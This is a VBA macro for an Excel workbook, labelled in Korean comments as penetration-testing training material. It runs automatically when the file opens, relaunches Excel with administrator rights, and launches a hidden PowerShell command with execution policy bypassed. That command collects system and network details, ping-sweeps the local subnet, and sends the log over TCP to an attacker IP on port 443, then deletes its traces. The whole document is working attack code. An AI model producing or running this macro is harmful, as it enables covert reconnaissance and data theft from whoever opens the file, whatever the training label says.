' =======================================
' VBA 정보 수집 및 내부 스캐닝 (443 포트 사용)
' **합법적인 모의 해킹 교육 및 테스트 목적**
' =======================================

Sub Auto_Open()
    ' Excel 파일이 열릴 때 자동으로 실행됩니다.
    On Error Resume Next
    
    Dim tempFilePath As String
    tempFilePath = Environ$("TEMP") & "\Restart_Flag.txt"
    
    If Dir(tempFilePath) = "" Then
        ' 1차 실행: 관리자 권한으로 재실행을 시도합니다.
        CreateObject("Scripting.FileSystemObject").CreateTextFile tempFilePath, True
        RestartExcelAsAdmin
    Else
        ' 2차 실행: 관리자 권한으로 실행되었으므로 정보를 수집합니다.
        Kill tempFilePath
        
        PerformInternalScanAndExfiltrate
        
        ' 정보 수집 및 전송 완료 후 최종 메시지 (사용자에게 보이지 않게 처리 권장)
        MsgBox "데이터 보안 점검 및 내부 네트워크 스캐닝이 완료되었습니다.", vbInformation
    End If
End Sub

' 관리자 권한으로 엑셀 재실행
Private Sub RestartExcelAsAdmin()
    Dim shellApp As Object
    Dim excelPath As String
    Dim workbookPath As String

    workbookPath = ThisWorkbook.FullName
    excelPath = Application.Path & "\EXCEL.EXE"

    Set shellApp = CreateObject("Shell.Application")
    ' ShellExecute "runas" 동사를 사용하여 관리자 권한을 요청합니다 (UAC 팝업 발생).
    shellApp.ShellExecute excelPath, """" & workbookPath & """", "", "runas", 1
    
    ' 재실행을 위해 현재 Excel을 종료합니다.
    Application.Quit
End Sub

' 시스템 정보 수집, 내부 스캐닝 및 데이터 유출 함수 (443 포트)
Sub PerformInternalScanAndExfiltrate()
    Dim shell As Object
    Dim psCommand As String
    Dim Attacker_IP As String
    Dim Attacker_Port As String
    Dim Log_File As String
    
    ' 1. Kali IP 및 Port 설정 (반드시 수정)
    Attacker_IP = "10.44.44.44"
    Attacker_Port = "443"
    
    Log_File = Environ$("TEMP") & "\scan_log_" & Format(Now, "hhmmss") & ".txt"
    
    Set shell = CreateObject("WScript.Shell")
    
    ' 2. PowerShell 스크립트 작성 (문자열 안정화: 내부 문자열은 모두 작은따옴표로 처리)
    
    ' PowerShell 스크립트의 큰따옴표를 작은따옴표로 모두 변경하여 VBA 문자열 오류를 해결합니다.
    psCommand = "powershell.exe -NoP -NonI -WindowStyle Hidden -Exec Bypass -Command """ & _
                "$L='" & Log_File & "'; $E='SilentlyContinue';" & _
                "Add-Content -Path $L -Value '--- Admin System Info ---' -Encoding Default -ErrorAction $E;" & _
                "Get-ComputerInfo | Select WindowsProductName, OsArchitecture, CsDomain, OsBuildNumber | Format-List | Out-String | Add-Content -Path $L -Encoding Default -ErrorAction $E;" & _
                "Get-NetIPConfiguration | Out-String | Add-Content -Path $L -Encoding Default -ErrorAction $E;" & _
                "Add-Content -Path $L -Value '--- Internal Network Scan (192.168/10.x Ping Sweep) ---' -Encoding Default -ErrorAction $E;" & _
                "$ipPrefix=(Get-NetIPConfiguration | Select-Object IPv4Address | Where-Object { $_.IPv4Address -like '192.168*' -or $_.IPv4Address -like '10*' } | Select-Object -First 1).IPv4Address.Split('.')[-4,-3,-2] -join '.'; " & _
                "if ($ipPrefix) { 1..254 | ForEach-Object { $ip=$ipPrefix+'.' + $_; if(Test-Connection -ComputerName $ip -Count 1 -ErrorAction Ignore -Quiet) { 'Host ' + $ip + ' is UP' | Add-Content -Path $L -Encoding Default } } };" & _
                "try {" & _
                "  $C=New-Object System.Net.Sockets.TcpClient('" & Attacker_IP & "'," & Attacker_Port & ");" & _
                "  $S=$C.GetStream();" & _
                "  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" & _
                "  $F=[System.IO.File]::ReadAllBytes($L);" & _
                "  $S.Write($F,0,$F.Length);" & _
                "  Start-Sleep -s 5;" & _
                "} catch {} finally {" & _
                "  if ($C) {$C.Close()};" & _
                "  Remove-Item $L -ErrorAction $E;" & _
                "}" & _
                """" ' PowerShell 명령 문자열을 닫는 최종 큰따옴표

    ' 3. PowerShell 실행 (숨김 모드, 실행 완료 대기)
    shell.Run psCommand, 0, True
    
    Set shell = Nothing
End Sub